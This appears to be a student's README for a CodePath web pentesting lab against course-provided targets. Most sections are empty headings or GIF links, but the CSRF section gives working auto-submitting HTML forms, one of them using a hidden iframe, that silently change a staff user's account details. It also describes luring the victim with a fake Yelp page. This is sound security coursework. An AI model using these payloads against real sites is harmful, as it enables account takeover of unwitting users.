# CodePath - Week 8 Project: Pentesting Live Targets

**1. Username Enumeration:**

**2. Insecure Direct Object Reference:**

<img src="https://github.com/jsska20/CodePath_Week-8-Project_Pentesting-Live-Targets/blob/master/IDOR_red.gif">

**3. SQL Injection:**

**4. Cross-Site Scripting:**

<img src="https://github.com/jsska20/CodePath_Week-8-Project_Pentesting-Live-Targets/blob/master/XSS_green.gif">

**5. Cross-Site Request Forgery:**

This challenge was a little time consuming but fun.

In order to successfully complete this type of attack I had to create an HTML form
that would forge a POST request from the victim's browser. To do this, I embedded the form
to my malicious website and then I had to tempt the victim into visiting it.

First, I had to figure out which target out of the three was vulnerable to CSRF.
So I created my form that would load automatically whenever the victim clicked on it.
I saved my form as an HTML file and I would just launch it by double-clicking on it
from my File Explorer. Then I simply changed the target on the HTML form URL from something like this:

`'<form action="https://35.224.226.149/blue/public/staff/users/edit.php?id=1" name="csrfForm" target="hiddenFrame" method="POST">`

To something like this:

`<form action="https://35.224.226.149/greeen/public/staff/users/edit.php?id=1" name="csrfForm" target="hiddenFrame" method="POST">`

Until I found that the target that was vulnerable to CSRF was the Red target.

- At first I wasn't using a hidden iframe, so my attack could still be noticed by the user as the request would be redirected to the user's details page after submitting the HTML form I had crafted:

```
<html><body onload="document.csrfForm.submit()">
  <form action="https://35.224.226.149/red/public/staff/users/edit.php?id=1" name="csrfForm" method="POST">
    <input type="hidden" name="first_name" value="JimmyJimmy" />
    <input type="hidden" name="last_name" value="Was Hacked" />
    <input type="hidden" name="username" value="hacker" />
    <input type="hidden" name="email" value="hacker@attacker.com">    
  </form>
</body></html>
```

<img src="https://github.com/jsska20/CodePath_Week-8-Project_Pentesting-Live-Targets/blob/master/CSRF_red_noIFRAME.gif">

- In order to completely hide the attack from the victim's view, I turned my form into a hidden iframe:

```
<html><body onload="document.csrfForm.submit()">
  <form action="https://35.224.226.149/red/public/staff/users/edit.php?id=1" name="csrfForm" target="hiddenFrame" method="POST">
    <input type="hidden" name="first_name" value="JimmyJimmy" />
    <input type="hidden" name="last_name" value="Was Hacked" />
    <input type="hidden" name="username" value="hacker" />
    <input type="hidden" name="email" value="hacker@attacker.com">  
  </form>
  <iframe name="hiddenFrame" style="display: none;"></iframe>
</body></html>
```
- This form was embedded into the attacker's website, and does all the dirty work in the background; Forging a request on behalf of the user without any visible evidence as soon as the site is opened.
- In order to trick the victim, I created a fake Yelp site and notified the victim about a bad Globitek review on this site through the contact feature on the Globitek site.

<img src="https://github.com/jsska20/CodePath_Week-8-Project_Pentesting-Live-Targets/blob/master/CSRF_red.gif">

**6. Session Hijacking/Fixation:**

